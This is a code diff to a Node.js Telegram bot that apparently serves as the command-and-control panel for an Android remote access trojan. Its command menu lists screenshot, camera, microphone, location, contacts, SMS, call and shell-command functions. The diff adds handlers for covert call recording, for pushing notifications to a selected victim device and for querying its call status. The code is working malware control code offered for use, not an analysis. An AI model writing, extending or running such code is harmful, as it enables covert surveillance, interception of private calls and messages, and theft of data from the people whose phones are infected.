@@ -80,22 +80,27 @@ async function startBot() {
     });
 
     await bot.setMyCommands([
-        { command: 'start', description: '🚀 Start DMA bot' },
-        { command: 'list', description: '📱 List devices' },
-        { command: 'info', description: 'ℹ️ Device info' },
-        { command: 'screenshot', description: '📸 Take screenshot' },
-        { command: 'camera', description: '📷 Take photo (front/rear)' },
-        { command: 'record', description: '🎤 Record audio (seconds)' },
-        { command: 'stop', description: '⏹️ Stop recording' },
-        { command: 'location', description: '📍 Get location' },
-        { command: 'contacts', description: '📒 Get contacts' },
-        { command: 'apps', description: '📱 List apps' },
-        { command: 'call', description: '📞 Make call (number)' },
-        { command: 'sms', description: '💬 Send SMS (number + text)' },
-        { command: 'messages', description: '📨 Get messages' },
-        { command: 'shell', description: '🖥️ Run command' },
-        { command: 'help', description: '❓ Help' }
-    ]);
+    { command: 'start', description: '🚀 Start DMA bot' },
+    { command: 'list', description: '📱 List devices' },
+    { command: 'select', description: '✅ Select device by number' },
+    { command: 'active', description: '📌 Show active device' },
+    { command: 'info', description: 'ℹ️ Device info' },
+    { command: 'screenshot', description: '📸 Take screenshot' },
+    { command: 'camera', description: '📷 Take photo (front/rear)' },
+    { command: 'record', description: '🎤 Record audio (seconds)' },
+    { command: 'stop', description: '⏹️ Stop recording' },
+    { command: 'record_call', description: '📞 Start call recording' },
+    { command: 'stop_call', description: '⏹️ Stop call recording' },
+    { command: 'location', description: '📍 Get location' },
+    { command: 'contacts', description: '📒 Get contacts' },
+    { command: 'apps', description: '📱 List apps' },
+    { command: 'call', description: '📞 Make call (number)' },
+    { command: 'sms', description: '💬 Send SMS (number + text)' },
+    { command: 'messages', description: '📨 Get messages' },
+    { command: 'shell', description: '🖥️ Run command' },
+    { command: 'notify', description: '🔔 Send notification (title + text)' },
+    { command: 'help', description: '❓ Help' }
+]);
 
     console.log('✅ Bot ready');
     setupBotHandlers();
@@ -393,7 +398,64 @@ System:
             bot.sendMessage(chatId, '❌ Invalid device number');
         }
     });
+// === START CALL RECORDING ===
+bot.onText(/\/record_call/, async (msg) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() !== adminId) return;
+    
+    const deviceId = activeDevice.get(chatId);
+    if (!deviceId) {
+        return bot.sendMessage(chatId, '❌ No device selected. Use /list then /select N');
+    }
+    
+    sendCommandToDevice(deviceId, 'start_call_recording', {});
+    bot.sendMessage(chatId, '📞 Starting call recording...');
+});
 
+// === STOP CALL RECORDING ===
+bot.onText(/\/stop_call/, async (msg) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() !== adminId) return;
+    
+    const deviceId = activeDevice.get(chatId);
+    if (!deviceId) {
+        return bot.sendMessage(chatId, '❌ No device selected');
+    }
+    
+    sendCommandToDevice(deviceId, 'stop_call_recording', {});
+    bot.sendMessage(chatId, '⏹️ Stopping call recording...');
+});
+
+// === SEND NOTIFICATION TO DEVICE ===
+bot.onText(/\/notify (.+) (.+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() !== adminId) return;
+    
+    const deviceId = activeDevice.get(chatId);
+    if (!deviceId) {
+        return bot.sendMessage(chatId, '❌ No device selected');
+    }
+    
+    const title = match[1];
+    const message = match[2];
+    
+    sendCommandToDevice(deviceId, 'send_notification', { title, message });
+    bot.sendMessage(chatId, `🔔 Notification sent: ${title}`);
+});
+
+// === GET CALL STATUS ===
+bot.onText(/\/call_status/, async (msg) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() !== adminId) return;
+    
+    const deviceId = activeDevice.get(chatId);
+    if (!deviceId) {
+        return bot.sendMessage(chatId, '❌ No device selected');
+    }
+    
+    sendCommandToDevice(deviceId, 'get_call_status', {});
+    bot.sendMessage(chatId, '📞 Getting call status...');
+});
     // === INFO ===
     bot.onText(/\/info/, async (msg) => {
         const chatId = msg.chat.id;
